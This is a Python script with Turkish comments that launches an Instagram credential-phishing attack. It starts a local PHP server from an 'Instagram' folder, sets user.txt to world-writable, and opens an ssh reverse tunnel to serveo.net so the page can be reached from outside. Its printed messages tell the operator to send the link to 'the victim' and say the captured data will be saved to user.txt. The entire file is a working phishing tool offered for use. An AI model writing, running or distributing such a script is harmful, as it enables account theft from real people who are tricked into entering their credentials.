import os
import sys
import time
import threading
from termcolor import colored

def install_required_packages():
    try:
        import termcolor
    except ImportError:
        print(colored("Essential packet not found. Installing...", "yellow"))
        os.system('pip install termcolor')
        print(colored("Installation completed.", "green"))

def start_php_server():
    try:
        time.sleep(2)
        print(colored("Starting PHP server...", "green"))
        os.chdir("Instagram")
        os.system("chmod 777 user.txt")
        os.system("php -q -S localhost:8000")
    except:
        print(colored("Failed to start PHP server.", "red"))
        sys.exit()

def start_tunnel_service():
    try:
        print(colored("Starting tunnel service...", "green"))
        os.system('ssh -R 80:localhost:8000 serveo.net')
    except:
        pass

def victim():
    time.sleep(1)
    print(colored("Send the link with the serveo extension to the victim.", "blue"))
    time.sleep(1)
    print(colored("The victim is expected...", "blue"))
    time.sleep(1)
    print(colored("The data will be saved to the user.txt file in the Instagram folder.", "red"))

def command():
    try:
        while True:
            cmd = input("")
    except KeyboardInterrupt:
        sys.exit()

# Ana kod bloğu
if __name__ == "__main__":
    # Gerekli paketleri kontrol et ve yükle
    install_required_packages()

    # Başlangıç mesajını göster
    banner = colored("""
        _____       _ _     _   _____         _     
 |_   _|     (_) |   | | |_   _|       (_)    
   | |  _ __  _| |_  | |   | | ___ _ __ _ ___ 
   | | | '_ \| | __| | |   | |/ _ \ '__| / __|
  _| |_| | | | | |_  | |  _| |  __/ |  | \__ \\
 |_____|_| |_|_|\__| |_| |___/\___|_|  |_|___/
                                              
    """, "blue")
    print(banner)

    # Thread'leri başlat
    t1 = threading.Thread(target=start_php_server)
    t2 = threading.Thread(target=start_tunnel_service)
    t3 = threading.Thread(target=victim)
    t4 = threading.Thread(target=command)

    t1.start()
    time.sleep(3)

    t2.start()
    time.sleep(3)

    t3.start()
    time.sleep(3)

    t4.start()

    t1.join()
    t2.join()
    t3.join()
    t4.join()
